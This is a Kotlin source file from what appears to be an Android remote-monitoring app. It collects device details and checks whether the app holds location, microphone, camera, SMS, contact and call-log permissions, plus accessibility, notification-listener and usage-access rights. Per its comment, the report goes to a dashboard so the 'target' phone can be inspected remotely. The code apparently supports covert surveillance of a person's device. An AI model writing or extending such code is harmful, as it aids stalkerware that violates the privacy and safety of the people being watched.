package com.sp.core.util

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import org.json.JSONArray
import org.json.JSONObject

/**
 * Device diagnostics - uploaded on demand so the state of the target can be
 * inspected from the dashboard without a terminal on the phone.
 */
object Diag {

    fun collect(ctx: Context): String {
        val out = JSONObject()
        try {
            out.put("sdk", Build.VERSION.SDK_INT)
            out.put("release", Build.VERSION.RELEASE)
            out.put("model", Build.MODEL)
            out.put("manufacturer", Build.MANUFACTURER)
            out.put("fingerprint", Build.FINGERPRINT)
            out.put("device_id", Prefs.deviceId(ctx))
            out.put("ts", System.currentTimeMillis())

            val perms = JSONArray()
            for (p in listOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.POST_NOTIFICATIONS
            )) {
                perms.put(JSONObject().apply {
                    put("p", p.substringAfterLast('.'))
                    put("granted", ctx.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED)
                })
            }
            out.put("perms", perms)

            val acc = Settings.Secure.getString(
                ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            out.put("accessibility", acc.contains(ctx.packageName))
            out.put("notif_listener", NotificationListenerEnabled(ctx))
            out.put("usage_access", isUsageAccessGranted(ctx))

            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val services = JSONArray()
            @Suppress("DEPRECATION")
            am.getRunningServices(256).forEach {
                services.put(it.service.className)
            }
            out.put("services", services)

            try {
                val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                out.put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
            } catch (_: Throwable) {
            }

            val crash = java.io.File(ctx.filesDir, "crash.log")
            if (crash.exists()) {
                out.put("crash_prev", crash.readText().take(4000))
                crash.delete()
            }
        } catch (t: Throwable) {
            try { out.put("error", t.toString()) } catch (_: Throwable) {}
        }
        return out.toString()
    }

    private fun NotificationListenerEnabled(ctx: Context): Boolean {
        return try {
            val flat = Settings.Secure.getString(
                ctx.contentResolver, "enabled_notification_listeners"
            ) ?: ""
            flat.contains(ctx.packageName)
        } catch (_: Throwable) {
            false
        }
    }

    private fun isUsageAccessGranted(ctx: Context): Boolean {
        return try {
            val am = ctx.getSystemService(
                Context.USAGE_STATS_SERVICE
            ) as android.app.usage.UsageStatsManager?
            if (am == null) return false
            val now = System.currentTimeMillis()
            val stats = am.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 60000, now
            )
            stats != null && stats.size > 0
        } catch (_: Throwable) {
            false
        }
    }
}
